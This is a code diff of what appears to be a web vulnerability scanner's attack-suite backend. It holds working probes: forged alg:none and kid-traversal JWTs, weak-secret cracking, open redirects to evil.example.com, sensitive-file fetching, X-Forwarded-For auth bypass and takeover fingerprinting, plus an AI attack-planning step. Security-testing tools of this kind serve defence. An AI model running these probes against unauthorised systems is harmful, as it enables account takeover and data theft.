+        "JWT Claims Inventory",
+        f"JWT contains: {list(payload_data.keys())}. Sensitive: {sensitive}",
+        f"Header: {json.dumps(header_data)}\nClaims: {json.dumps(payload_data)}",
+        target, False,
+        "Minimize sensitive data in JWT payloads. Use opaque tokens for sensitive data.",
+        confidence="high")
 
-    # Test alg:none
-    none_header = _b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
-    none_payload = parts[1]
-    none_token = f"{none_header}.{none_payload}."
+    # Check expiry
+    exp = payload_data.get("exp")
+    if exp and exp < time.time():
+        yield _finding("jwt", "expired_jwt", "info",
+            "JWT Token is Expired",
+            f"Token expired at {datetime.fromtimestamp(exp).isoformat()}. "
+            f"Server should reject this but may not.",
+            f"exp: {exp}", target, False, "Verify expiry enforcement server-side.", confidence="low")
 
-    test_paths = ["/api/me", "/api/user", "/me", "/profile"]
-    parsed = urlparse(target)
-    base = f"{parsed.scheme}://{parsed.netloc}"
+    # alg:none bypass
+    none_header = base64.urlsafe_b64encode(
+        json.dumps({"alg": "none", "typ": "JWT"}).encode()
+    ).rstrip(b"=").decode()
+    none_token = f"{none_header}.{parts[1]}."
 
-    for path in test_paths:
-        test_url = base + path
+    for path in ["/api/me", "/api/user", "/api/v1/auth/me", "/me", "/profile"]:
         try:
-            resp = await client.get(
-                test_url,
-                headers={"Authorization": f"Bearer {none_token}"},
-            )
-            if resp.status_code == 200 and len(resp.content) > 50:
-                yield _finding(
-                    module="jwt",
-                    test_name="jwt_alg_none",
-                    severity="critical",
-                    title="JWT Algorithm None Attack — Authentication Bypass",
-                    description=f"The server accepted a JWT with alg:none (no signature verification) at '{path}'.",
-                    evidence=f"GET {test_url}\nForged token (alg:none): {none_token[:80]}...\nHTTP {resp.status_code}\nResponse: {resp.text[:200]}",
-                    url=test_url,
-                    is_vulnerable=True,
-                    remediation="Reject JWTs with alg:none. Explicitly whitelist allowed algorithms server-side.",
-                )
+            r = await client.get(target + path,
+                                  headers={"Authorization": f"Bearer {none_token}"}, timeout=8)
+            if r.status_code == 200 and len(r.text) > 30:
+                yield _finding("jwt", "alg_none_bypass", "critical",
+                    "JWT Algorithm 'none' Bypass — Auth Bypassed",
+                    "Server accepts JWT tokens with alg:none (unsigned). "
+                    "Full authentication bypass — any user can forge tokens.",
+                    f"Unsigned token accepted at {target + path}\nStatus: {r.status_code}",
+                    target + path, True,
+                    "Reject tokens with alg:none. Maintain a server-side algorithm allowlist. "
+                    "Use a well-tested JWT library.",
+                    confidence="high")
                 break
-        except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
-            continue
+        except httpx.HTTPError:
+            pass
 
-    # Test weak secrets (HMAC-SHA256)
+    # Weak secret brute force
     alg = header_data.get("alg", "").upper()
     if alg in ("HS256", "HS384", "HS512"):
-        weak_secrets = ["secret", "password", "admin", "key", "test", "123456", "changeme", "jwt_secret"]
         signing_input = f"{parts[0]}.{parts[1]}".encode()
         try:
-            expected_sig = _b64url_decode(parts[2])
+            expected = _b64d(parts[2])
         except Exception:
             return
 
-        hash_fn = hashlib.sha256 if alg == "HS256" else (hashlib.sha384 if alg == "HS384" else hashlib.sha512)
+        hash_fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
+                   "HS512": hashlib.sha512}.get(alg, hashlib.sha256)
 
-        for secret in weak_secrets:
-            sig = hmac.new(secret.encode(), signing_input, hash_fn).digest()
-            if hmac.compare_digest(sig, expected_sig):
-                yield _finding(
-                    module="jwt",
-                    test_name="jwt_weak_secret",
-                    severity="critical",
-                    title=f"JWT Signed with Weak Secret: '{secret}'",
-                    description=f"The JWT is signed with a common/weak secret '{secret}'. Attackers can forge tokens.",
-                    evidence=f"Algorithm: {alg}\nSecret matched: {secret!r}",
-                    url=target,
-                    is_vulnerable=True,
-                    remediation="Use a cryptographically random secret of at least 256 bits. Rotate all existing tokens.",
-                )
-                break
+        for secret in JWT_WEAK_SECRETS:
+            computed = hmac.new(secret.encode(), signing_input, hash_fn).digest()
+            if hmac.compare_digest(computed, expected):
+                yield _finding("jwt", "weak_jwt_secret", "critical",
+                    f"JWT Signed with Weak Secret: '{secret}'",
+                    f"JWT HMAC secret is a common weak value. "
+                    f"Attacker can forge tokens for any user ID/role.",
+                    f"Algorithm: {alg}\nCracked secret: {secret}",
+                    target, True,
+                    "Use a cryptographically random secret of ≥256 bits. "
+                    "Rotate the secret immediately and invalidate all existing tokens.",
+                    confidence="high")
+                return
+
+        # kid path traversal
+        kid = header_data.get("kid", "")
+        if kid:
+            for kid_payload in JWT_KID_PAYLOADS[:2]:
+                tampered_header = dict(header_data)
+                tampered_header["kid"] = kid_payload
+                new_header = base64.urlsafe_b64encode(
+                    json.dumps(tampered_header).encode()
+                ).rstrip(b"=").decode()
+                # Use empty string as secret (matches /dev/null content)
+                empty_sig = hmac.new(b"", f"{new_header}.{parts[1]}".encode(),
+                                      hashlib.sha256).digest()
+                new_sig = base64.urlsafe_b64encode(empty_sig).rstrip(b"=").decode()
+                new_token = f"{new_header}.{parts[1]}.{new_sig}"
+                for path in ["/api/me", "/api/user"]:
+                    try:
+                        r = await client.get(target + path,
+                                              headers={"Authorization": f"Bearer {new_token}"},
+                                              timeout=8)
+                        if r.status_code == 200 and len(r.text) > 30:
+                            yield _finding("jwt", "kid_path_traversal", "critical",
+                                "JWT 'kid' Path Traversal",
+                                f"Server accepted JWT with kid={kid_payload}. "
+                                f"Attacker can control the key used for signature verification.",
+                                f"kid: {kid_payload}\nPath: {target + path}\nStatus: 200",
+                                target + path, True,
+                                "Validate kid values against an allowlist. "
+                                "Never use kid values as file system paths.",
+                                confidence="medium")
+                    except httpx.HTTPError:
+                        pass
 
 
-# ---------------------------------------------------------------------------
-# Module 8: Auth Bypass
-# ---------------------------------------------------------------------------
+# ── Module: Open Redirect ─────────────────────────────────────────────────────
 
-async def _module_auth_bypass(target: str, client: httpx.AsyncClient) -> AsyncGenerator[AttackFinding, None]:
-    parsed = urlparse(target)
-    base = f"{parsed.scheme}://{parsed.netloc}"
+async def _module_redirect(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    for param in REDIRECT_PARAMS[:10]:
+        for payload in REDIRECT_PAYLOADS[:4]:
+            test_url = f"{target}?{param}={payload}"
+            try:
+                r = await client.get(test_url, follow_redirects=False, timeout=8)
+                loc = r.headers.get("location", "")
+                if "evil.example.com" in loc or "javascript:" in loc:
+                    yield _finding("redirect", "open_redirect", "high",
+                        f"Open Redirect via '{param}' parameter",
+                        f"Parameter `{param}` redirects to attacker-controlled URL `{payload}`. "
+                        f"Can be chained with OAuth flows for account takeover.",
+                        f"URL: {test_url}\nLocation: {loc}",
+                        test_url, True,
+                        "Validate redirect targets against an allowlist. "
+                        "Reject absolute URLs or URLs with different origins.",
+                        confidence="high")
+                    return
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
 
-    # 1. Common admin/sensitive paths
-    admin_paths = [
-        "/admin", "/admin/users", "/api/admin", "/api/internal",
-        "/debug", "/.env", "/.git/config", "/actuator",
-        "/actuator/health", "/actuator/env",
-    ]
 
-    for path in admin_paths:
-        url = base + path
+# ── Module: Auth Bypass ───────────────────────────────────────────────────────
+
+async def _module_auth_bypass(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    # Sensitive file exposure
+    for path in COMMON_SENSITIVE_PATHS[:15]:
+        url = target + path
         try:
-            resp = await client.get(url)
-            if resp.status_code == 200 and len(resp.content) > 100:
-                yield _finding(
-                    module="auth_bypass",
-                    test_name=f"exposed_path_{path.strip('/').replace('/', '_')}",
-                    severity="high",
-                    title=f"Sensitive Path Accessible Without Authentication: {path}",
-                    description=f"The path '{path}' returned HTTP 200 with substantial content without requiring authentication.",
-                    evidence=f"GET {url}\nHTTP {resp.status_code}\nContent-Length: {len(resp.content)}\nSnippet: {resp.text[:200]}",
-                    url=url,
-                    is_vulnerable=True,
-                    remediation=f"Protect '{path}' with proper authentication and authorization checks.",
-                )
-        except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
-            continue
+            r = await client.get(url, timeout=6)
+            if r.status_code == 200 and len(r.text) > 50:
+                sev = "critical" if any(kw in r.text for kw in
+                                         ["password", "secret", "key", "token", "aws"]) else "high"
+                yield _finding("auth_bypass", "sensitive_file_exposure", sev,
+                    f"Sensitive File Exposed: {path}",
+                    f"File {path} is publicly accessible (HTTP 200). "
+                    f"May contain credentials, configuration, or source code.",
+                    f"URL: {url}\nSize: {len(r.text)} bytes\nSnippet: {r.text[:300]}",
+                    url, True,
+                    f"Block access to {path} in your web server configuration. "
+                    f"Remove sensitive files from the webroot.",
+                    confidence="high")
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
 
-    # 2. HTTP method override
-    api_url = base + "/api/users"
-    try:
-        resp = await client.post(
-            api_url,
-            headers={"X-HTTP-Method-Override": "GET"},
-        )
-        if resp.status_code == 200:
-            yield _finding(
-                module="auth_bypass",
-                test_name="http_method_override",
-                severity="medium",
-                title="HTTP Method Override Accepted",
-                description="The server accepted X-HTTP-Method-Override header, potentially allowing method restriction bypass.",
-                evidence=f"POST {api_url}\nX-HTTP-Method-Override: GET\nHTTP {resp.status_code}",
-                url=api_url,
-                is_vulnerable=True,
-                remediation="Disable or restrict HTTP method override headers. Validate the actual HTTP method server-side.",
-            )
-    except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
-        pass
-
-    # 3. Path traversal bypass
-    traversal_paths = ["//admin", "/api/./admin"]
-    for path in traversal_paths:
-        url = base + path
+    # X-Forwarded-For bypass
+    for path in ["/admin", "/api/admin", "/admin/users"]:
+        url = target + path
         try:
-            resp = await client.get(url)
-            if resp.status_code == 200 and len(resp.content) > 100:
-                yield _finding(
-                    module="auth_bypass",
-                    test_name=f"path_traversal_bypass_{path.strip('/').replace('/', '_')}",
-                    severity="high",
-                    title=f"Path Traversal Auth Bypass: {path}",
-                    description=f"The path '{path}' bypassed access controls via path traversal/normalization.",
-                    evidence=f"GET {url}\nHTTP {resp.status_code}\nSnippet: {resp.text[:200]}",
-                    url=url,
-                    is_vulnerable=True,
-                    remediation="Normalize URL paths before applying authorization checks.",
-                )
-        except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
-            continue
-
-    # 4. X-Forwarded-For bypass
-    for path in ["/admin", "/api/admin"]:
-        url = base + path
-        try:
-            # First check if it's normally blocked
-            normal_resp = await client.get(url)
-            if normal_resp.status_code in (401, 403):
-                xff_resp = await client.get(url, headers={"X-Forwarded-For": "127.0.0.1"})
-                if xff_resp.status_code == 200:
-                    yield _finding(
-                        module="auth_bypass",
-                        test_name=f"xff_bypass_{path.strip('/')}",
-                        severity="high",
-                        title=f"X-Forwarded-For Bypass at {path}",
-                        description=f"Adding 'X-Forwarded-For: 127.0.0.1' bypassed the 401/403 restriction at '{path}'.",
-                        evidence=f"Normal: GET {url} → {normal_resp.status_code}\nWith X-Forwarded-For: 127.0.0.1 → {xff_resp.status_code}",
-                        url=url,
-                        is_vulnerable=True,
-                        remediation="Do not use X-Forwarded-For for IP-based access control. Trust only the actual connection IP.",
-                    )
-        except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
-            continue
+            r_plain = await client.get(url, timeout=6)
+            r_xff = await client.get(url, headers={"X-Forwarded-For": "127.0.0.1"}, timeout=6)
+            if r_plain.status_code in (401, 403) and r_xff.status_code == 200:
+                yield _finding("auth_bypass", "xff_bypass", "high",
+                    f"Auth Bypass via X-Forwarded-For on {path}",
+                    f"X-Forwarded-For: 127.0.0.1 header grants access to {path} "
+                    f"that is otherwise blocked.",
+                    f"Without header: {r_plain.status_code}, With header: {r_xff.status_code}",
+                    url, True,
+                    "Never use X-Forwarded-For for access control. "
+                    "Use authentication tokens and server-side session validation.",
+                    confidence="high")
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
 
 
-# ---------------------------------------------------------------------------
-# Module 9: Subdomain/Service Takeover
-# ---------------------------------------------------------------------------
+# ── Module: Takeover Detection ────────────────────────────────────────────────
 
-async def _module_takeover(target: str, client: httpx.AsyncClient) -> AsyncGenerator[AttackFinding, None]:
+async def _module_takeover(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
     fingerprints = [
-        ("There isn't a GitHub Pages site here", "GitHub Pages takeover possible"),
-        ("NoSuchBucket", "AWS S3 bucket takeover possible"),
-        ("No Such Account", "Heroku account takeover possible"),
-        ("This page is in Maintenance Mode", "Webflow site takeover possible"),
-        ("The specified bucket does not exist", "AWS S3 bucket takeover possible"),
-        ("Repository not found", "GitHub/Bitbucket repository takeover possible"),
+        ("There isn't a GitHub Pages site here", "GitHub Pages", "critical"),
+        ("NoSuchBucket", "AWS S3", "critical"),
+        ("The specified bucket does not exist", "AWS S3", "critical"),
+        ("No Such Account", "Heroku", "critical"),
+        ("Repository not found", "GitHub/Bitbucket", "critical"),
+        ("This page is in Maintenance Mode", "Webflow", "high"),
+        ("Fastly error: unknown domain", "Fastly CDN", "high"),
+        ("The request could not be satisfied", "CloudFront", "high"),
+        ("Domain not configured", "Netlify", "high"),
+        ("Unrecognized domain", "Surge.sh", "high"),
+        ("project not found", "Firebase/Vercel", "high"),
+        ("There is no app configured at that hostname", "Heroku", "critical"),
     ]
-    takeover_server_patterns = ["fastly.net", "herokudns.com", "amazonaws.com", "github.io"]
-
     try:
-        resp = await client.get(target)
-        body = resp.text
-        server = resp.headers.get("server", "").lower()
-
-        for fingerprint, description in fingerprints:
-            if fingerprint.lower() in body.lower():
-                yield _finding(
-                    module="takeover",
-                    test_name="subdomain_takeover_fingerprint",
-                    severity="critical",
-                    title=f"Subdomain/Service Takeover Possible — {description}",
-                    description=f"Response body contains takeover fingerprint: '{fingerprint}'. The underlying service may be unclaimed.",
-                    evidence=f"GET {target}\nHTTP {resp.status_code}\nFingerprint: {fingerprint}\nServer: {resp.headers.get('server', 'N/A')}",
-                    url=target,
-                    is_vulnerable=True,
-                    remediation="Reclaim or remove the DNS record pointing to this unclaimed service.",
-                )
-                return  # One finding per target
-
-        # 404 from known CDN/hosting providers
-        if resp.status_code == 404 and any(p in server for p in takeover_server_patterns):
-            yield _finding(
-                module="takeover",
-                test_name="subdomain_takeover_cdn_404",
-                severity="high",
-                title=f"Possible Service Takeover — 404 from Hosting Provider",
-                description=f"The target returns 404 via a known hosting provider ({server}), which may indicate an unclaimed service.",
-                evidence=f"GET {target}\nHTTP {resp.status_code}\nServer: {resp.headers.get('server', 'N/A')}",
-                url=target,
-                is_vulnerable=True,
-                remediation="Verify DNS records and ensure all referenced services are claimed and active.",
-            )
-
-    except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
+        r = await client.get(target, timeout=10)
+        body_lower = r.text.lower()
+        server = r.headers.get("server", "").lower()
+        for fp, service, severity in fingerprints:
+            if fp.lower() in body_lower or fp.lower() in server:
+                yield _finding("takeover", "service_takeover", severity,
+                    f"Potential {service} Subdomain/Service Takeover",
+                    f"Response contains `{fp}` — indicates an unclaimed {service} resource. "
+                    f"Attacker can claim this service and host malicious content on this domain.",
+                    f"Fingerprint: {fp}\nStatus: {r.status_code}",
+                    target, True,
+                    f"Claim or decommission the unclaimed {service} resource. "
+                    f"Remove CNAME records pointing to unclaimed services.",
+                    confidence="high")
+                return
+    except httpx.HTTPError:
         pass
 
 
-# ---------------------------------------------------------------------------
-# Main streaming function
-# ---------------------------------------------------------------------------
+# ── Main Stream ───────────────────────────────────────────────────────────────
 
 async def _stream_attack_suite(scan_id: str, req: AttackSuiteRequest) -> AsyncGenerator[str, None]:
-    def _sse(event: str, data: dict) -> str:
-        return f"event: {event}\ndata: {json.dumps(data)}\n\n"
-
     start_time = time.monotonic()
-    timestamp = datetime.now(timezone.utc).isoformat()
-
-    yield _sse("start", {
-        "scan_id": scan_id,
-        "target": req.target,
-        "modules": req.modules,
-        "timestamp": timestamp,
-    })
-
-    _scan_history[scan_id] = {
-        "id": scan_id,
-        "target": req.target,
-        "modules": req.modules,
-        "status": "running",
-        "started_at": timestamp,
-        "findings": [],
-        "counts": {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0},
-    }
-
     findings: list[dict] = []
     counts: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
 
-    try:
-        async with httpx.AsyncClient(
-            headers=req.auth_headers,
-            timeout=req.timeout,
-            follow_redirects=req.follow_redirects,
-            verify=False,  # Bug bounty targets may have self-signed certs
-        ) as client:
-            module_map = {
-                "headers": lambda: _module_headers(req.target, client),
-                "redirect": lambda: _module_redirect(req.target, client),
-                "xss": lambda: _module_xss(req.target, client),
-                "sqli": lambda: _module_sqli(req.target, client),
-                "ssrf": lambda: _module_ssrf(req.target, client),
-                "graphql": lambda: _module_graphql(req.target, client),
-                "jwt": lambda: _module_jwt(req.target, client, req.auth_headers),
-                "auth_bypass": lambda: _module_auth_bypass(req.target, client),
-                "takeover": lambda: _module_takeover(req.target, client),
-            }
+    yield _sse("start", {
+        "scan_id": scan_id, "target": req.target,
+        "modules": req.modules, "timestamp": datetime.now(timezone.utc).isoformat(),
+    })
 
-            for module_name in req.modules:
-                if module_name not in module_map:
-                    continue
+    _scan_history[scan_id] = {
+        "id": scan_id, "target": req.target, "modules": req.modules,
+        "status": "running", "started_at": datetime.now(timezone.utc).isoformat(),
+        "findings": [], "counts": counts, "crawl": {},
+    }
 
-                yield _sse("progress", {
-                    "message": f"Running module: {module_name}",
-                    "module": module_name,
-                })
-                await asyncio.sleep(0)
+    def emit(f: dict):
+        findings.append(f)
+        sev = f.get("severity", "info").lower()
+        counts[sev] = counts.get(sev, 0) + 1
+        _scan_history[scan_id]["findings"] = findings
+        _scan_history[scan_id]["counts"] = counts
 
-                try:
-                    async for finding in module_map[module_name]():
-                        findings.append(dict(finding))
-                        sev = finding.get("severity", "info").lower()
-                        counts[sev] = counts.get(sev, 0) + 1
-                        _scan_history[scan_id]["findings"] = findings
-                        _scan_history[scan_id]["counts"] = counts
-                        yield _sse("finding", dict(finding))
-                        await asyncio.sleep(0)
-                except Exception as exc:
+    headers = dict(req.auth_headers)
+    headers.setdefault("User-Agent", "AttackTrace-Security-Scanner/2.0")
+
+    # Short connect timeout ensures unreachable targets fail fast
+    _timeout = httpx.Timeout(connect=4.0, read=float(req.timeout),
+                              write=float(req.timeout), pool=5.0)
+
+    async with httpx.AsyncClient(headers=headers, timeout=_timeout,
+                                  follow_redirects=req.follow_redirects,
+                                  verify=False) as client:
+
+        # ── Login ──────────────────────────────────────────────────────────
+        auth_headers: dict[str, str] = {}
+        if req.login.enabled:
+            yield _sse("progress", {"message": "🔐 Performing login...", "module": "login"})
+            try:
+                auth_headers = await _perform_login(client, req.login, req.target)
+                if auth_headers:
+                    client.headers.update(auth_headers)
                     yield _sse("progress", {
-                        "message": f"Module {module_name} error: {exc}",
-                        "module": module_name,
+                        "message": f"✅ Login successful. Auth type: {list(auth_headers.keys())[0]}",
+                        "module": "login"
                     })
+                else:
+                    yield _sse("progress", {"message": "⚠️ Login attempted but no session captured.", "module": "login"})
+            except Exception as e:
+                yield _sse("progress", {"message": f"Login error: {e}", "module": "login"})
 
-                yield _sse("progress", {
-                    "message": f"Module {module_name} complete",
-                    "module": module_name,
+        # ── Second account client ──────────────────────────────────────────
+        client2: Optional[httpx.AsyncClient] = None
+        if req.account2.enabled:
+            acc2_headers = {}
+            if req.account2.bearer_token:
+                acc2_headers["Authorization"] = f"Bearer {req.account2.bearer_token}"
+            elif req.account2.cookie:
+                acc2_headers["Cookie"] = req.account2.cookie
+            if acc2_headers:
+                client2 = httpx.AsyncClient(headers={**headers, **acc2_headers},
+                                             timeout=_timeout, verify=False)
+
+        # ── Connectivity probe ─────────────────────────────────────────────
+        try:
+            await client.head(req.target, timeout=httpx.Timeout(connect=4.0, read=5.0, write=5.0, pool=5.0))
+        except (httpx.ConnectError, httpx.ConnectTimeout):
+            yield _sse("error", {"message": f"Target {req.target} is unreachable. Check the URL and try again."})
+            return
+
+        # ── Crawl ──────────────────────────────────────────────────────────
+        crawl_result = CrawlResult()
+        if "crawl" in req.modules and req.crawler.enabled:
+            yield _sse("progress", {
+                "message": f"🕷️ Starting crawler (max depth={req.crawler.max_depth}, "
+                           f"max pages={req.crawler.max_pages})...",
+                "module": "crawl"
+            })
+            try:
+                crawl_result = await _crawl(req.target, client, req.crawler)
+                yield _sse("crawl_complete", {
+                    "pages": len(crawl_result.pages),
+                    "forms": len(crawl_result.forms),
+                    "endpoints": len(crawl_result.endpoints),
+                    "tech_stack": crawl_result.tech_stack,
+                    "ids_found": len(crawl_result.ids_found),
                 })
+                yield _sse("progress", {
+                    "message": f"✅ Crawl complete: {len(crawl_result.pages)} pages, "
+                               f"{len(crawl_result.forms)} forms, "
+                               f"{len(crawl_result.endpoints)} endpoints. "
+                               f"Tech: {', '.join(crawl_result.tech_stack) or 'unknown'}",
+                    "module": "crawl"
+                })
+                _scan_history[scan_id]["crawl"] = {
+                    "pages": len(crawl_result.pages),
+                    "forms": len(crawl_result.forms),
+                    "endpoints": list(crawl_result.endpoints)[:50],
+                    "tech_stack": crawl_result.tech_stack,
+                }
+            except Exception as e:
+                yield _sse("progress", {"message": f"Crawler error: {e}", "module": "crawl"})
 
-        duration = time.monotonic() - start_time
-        _scan_history[scan_id].update({
-            "status": "completed",
-            "completed_at": datetime.now(timezone.utc).isoformat(),
-            "findings": findings,
-            "counts": counts,
-            "duration_seconds": round(duration, 2),
-        })
+        # ── AI Strategy Planning ───────────────────────────────────────────
+        if req.ai_analysis and crawl_result.tech_stack:
+            yield _sse("progress", {"message": "🤖 AI analyzing target and planning attack strategy...", "module": "ai"})
+            try:
+                plan = await _ai_plan_attack(
+                    req.target, crawl_result.tech_stack,
+                    list(crawl_result.endpoints)[:20], req.modules
+                )
+                if plan:
+                    yield _sse("ai_plan", {"plan": plan, "tech_stack": crawl_result.tech_stack})
+                    yield _sse("progress", {"message": f"🤖 AI Strategy: {plan[:150]}...", "module": "ai"})
+            except Exception as e:
+                yield _sse("progress", {"message": f"AI planning skipped: {e}", "module": "ai"})
 
-        yield _sse("complete", {
-            "scan_id": scan_id,
-            "total_findings": len(findings),
-            "counts": counts,
-            "duration_seconds": round(duration, 2),
-        })
+        # ── Run modules ────────────────────────────────────────────────────
+        module_runners = {
+            "headers":   lambda: _module_headers(req.target, client),
+            "cors":      lambda: _module_cors(req.target, client),
+            "csrf":      lambda: _module_csrf(req.target, client, crawl_result.forms),
+            "xss":       lambda: _module_xss(req.target, client, crawl_result.forms),
+            "sqli":      lambda: _module_sqli(req.target, client, crawl_result.forms),
+            "ssrf":      lambda: _module_ssrf(req.target, client),
+            "idor":      lambda: _module_idor(req.target, client, client2,
+                                               crawl_result.endpoints, crawl_result.ids_found),
+            "privilege": lambda: _module_privilege(req.target, client, crawl_result.forms),
+            "account":   lambda: _module_account_takeover(req.target, client),
+            "cache":     lambda: _module_cache(req.target, client),
+            "race":      lambda: _module_race(req.target, client),
+            "business":  lambda: _module_business(req.target, client, crawl_result.forms),
+            "graphql":   lambda: _module_graphql(req.target, client),
+            "jwt":       lambda: _module_jwt(req.target, client, {**req.auth_headers, **auth_headers}),
+            "redirect":  lambda: _module_redirect(req.target, client),
+            "auth_bypass": lambda: _module_auth_bypass(req.target, client),
+            "takeover":  lambda: _module_takeover(req.target, client),
+        }
 
-    except Exception as exc:
-        _scan_history[scan_id].update({"status": "failed", "error": str(exc)})
-        yield _sse("error", {"message": str(exc)})
+        for mod_id in req.modules:
+            if mod_id == "crawl" or mod_id not in module_runners:
+                continue
+            meta = next((m for m in MODULES_META if m["id"] == mod_id), {"label": mod_id})
+            yield _sse("progress", {"message": f"▶ Running: {meta['label']}...", "module": mod_id})
+            try:
+                async for finding in module_runners[mod_id]():
+                    emit(finding)
+                    yield _sse("finding", finding)
+                    await asyncio.sleep(0)
+            except Exception as e:
+                yield _sse("progress", {"message": f"Module {mod_id} error: {e}", "module": mod_id})
+            yield _sse("progress", {"message": f"✓ {meta['label']} done.", "module": mod_id})
+
+        if client2:
+            await client2.aclose()
+
+    duration = round(time.monotonic() - start_time, 1)
+    _scan_history[scan_id].update({
+        "status": "completed",
+        "completed_at": datetime.now(timezone.utc).isoformat(),
+        "findings": findings, "counts": counts, "duration_seconds": duration,
+    })
+
+    yield _sse("complete", {
+        "scan_id": scan_id, "total_findings": len(findings),
+        "counts": counts, "duration_seconds": duration,
+        "timestamp": datetime.now(timezone.utc).isoformat(),
+    })
 
 
-# ---------------------------------------------------------------------------
-# Endpoints
-# ---------------------------------------------------------------------------
+# ── Endpoints ─────────────────────────────────────────────────────────────────
 
-@router.post("/scan", summary="Run an attack suite scan and stream results")
-async def run_attack_suite_scan(
+@router.post("/scan")
+async def run_attack_suite(
     payload: AttackSuiteRequest,
     current_user: Annotated[User, Depends(get_current_user)],
 ) -> StreamingResponse:
@@ -964,28 +1560,21 @@ async def run_attack_suite_scan(
     return StreamingResponse(
         _stream_attack_suite(scan_id, payload),
         media_type="text/event-stream",
-        headers={
-            "Cache-Control": "no-cache",
-            "Connection": "keep-alive",
-            "X-Accel-Buffering": "no",
-        },
+        headers={"Cache-Control": "no-cache", "Connection": "keep-alive",
+                 "X-Accel-Buffering": "no"},
     )
 
 
-@router.get("/scans", summary="List attack suite scan history")
-async def list_attack_suite_scans(
+@router.get("/scans")
+async def list_attack_scans(
     current_user: Annotated[User, Depends(get_current_user)],
 ) -> dict:
-    scans = sorted(
-        _scan_history.values(),
-        key=lambda s: s.get("started_at", ""),
-        reverse=True,
-    )
+    scans = sorted(_scan_history.values(), key=lambda s: s.get("started_at", ""), reverse=True)
     return {"items": scans, "total": len(scans)}
 
 
-@router.get("/scans/{scan_id}", summary="Get attack suite scan result")
-async def get_attack_suite_scan(
+@router.get("/scans/{scan_id}")
+async def get_attack_scan(
     scan_id: str,
     current_user: Annotated[User, Depends(get_current_user)],
 ) -> dict:
@@ -995,13 +1584,8 @@ async def get_attack_suite_scan(
     return scan
 
 
-@router.get("/modules", summary="List available attack suite modules")
-async def list_attack_suite_modules(
+@router.get("/modules")
+async def list_modules(
     current_user: Annotated[User, Depends(get_current_user)],
 ) -> dict:
-    return {
-        "modules": [
-            {"name": name, "description": desc}
-            for name, desc in AVAILABLE_MODULES.items()
-        ]
-    }
+    return {"modules": MODULES_META}
